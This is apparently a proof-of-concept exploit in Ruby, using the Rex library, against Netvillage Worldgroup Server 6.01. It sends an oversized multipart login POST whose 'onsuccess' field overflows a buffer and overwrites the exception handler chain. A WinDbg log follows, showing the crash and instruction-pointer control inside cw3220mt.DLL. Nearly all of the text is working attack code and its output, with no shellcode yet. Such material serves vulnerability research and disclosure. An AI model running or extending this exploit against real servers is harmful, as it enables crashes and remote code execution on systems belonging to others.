#!/usr/bin/env ruby
# Netvillage Worldgroup Server 6.01
require 'rex'

host = ARGV[0]

def usage
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

begin
 sock = Rex::Proto::Http::Client.new(host, port = "80", context = {}, ssl = false)

     fuzz = Rex::Text.pattern_create(8024) + ":"
     fuzz[1404,4] = [0xfeedface].pack('V')
     fuzz[1408,4] = [0xdeadbeef].pack('V')

     uidb  = Rex::Text.rand_text_numeric(23)

     file =  "-----------------------------#{uidb}\r\n"
     file << "Content-Disposition: form-data; name=\"uid\"" + "\r\n\r\n"
     file << "blah\r\n"
     file <<  "-----------------------------#{uidb}\r\n"
     file << "Content-Disposition: form-data; name=\"pwd\"" + "\r\n\r\n"
     file << "thisisafakepasswd\r\n"
     file <<  "-----------------------------#{uidb}\r\n"
     file << "Content-Disposition: form-data; name=\"onsuccess\"" + "\r\n\r\n"
     file << "#{fuzz}\r\n"
     file << "-----------------------------#{uidb}--"
 
     req = sock.request_raw(
            {
               'uri'     => "/session/login/",
               'method'  => "POST",
               'data'    => file,
               'ctype'   => "multipart/form-data; boundary=---------------------------#{uidb}",
               'headers' => {
                 'DNT' => '1',
                 'Connection' => 'close',
                 'Upgrade-Insecure-Requests' => '1',
                 'Accept-Encoding' => 'gzip, deflate',
               },
            },)
 
     sock.send_request(req)
     data = sock.read_response()
      
rescue => e
 puts "[!] #{e.to_s}"
end
__END__
0:000> !exchain
0012f36c: deadbeef
Invalid exception stack at feedface
0:000> g
(380.568): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=deadbeef edx=779c71cd esi=00000000 edi=00000000
eip=deadbeef esp=0012e758 ebp=0012e778 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
deadbeef ??              ???
0:000> .exr 0x12e840
ExceptionAddress: 015a2b4f (cw3220mt!memcpy+0x00000017)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000001
   Parameter[1]: 00130000
Attempt to write to address 00130000
0:000> lmvm cw3220mt
start    end        module name
015a0000 015ed000   cw3220mt C (export symbols)       C:\WGSERV\cw3220mt.DLL
    Loaded symbol image file: C:\WGSERV\cw3220mt.DLL
    Image path: C:\WGSERV\cw3220mt.DLL
    Image name: cw3220mt.DLL
    Timestamp:        ***** Invalid (9371275D)
    CheckSum:         00000000
    ImageSize:        0004D000
    File version:     4.2.0.0
    Product version:  0.0.0.0
    File flags:       0 (Mask 0)
    File OS:          4 Unknown Win32
    File type:        2.64 Dll
    File date:        00000000.00000000
    Translations:     0409.04e4
    CompanyName:      Borland International
    ProductName:      Borland C++ 5.0
    InternalName:     Run Time Library
    ProductVersion:   5.0 Time Library
    FileVersion:      2.0
    SpecialBuild:     2.0
    FileDescription:  Dynamic Link Run Time Library
    LegalCopyright:   Copyright Borland International 1994,1996

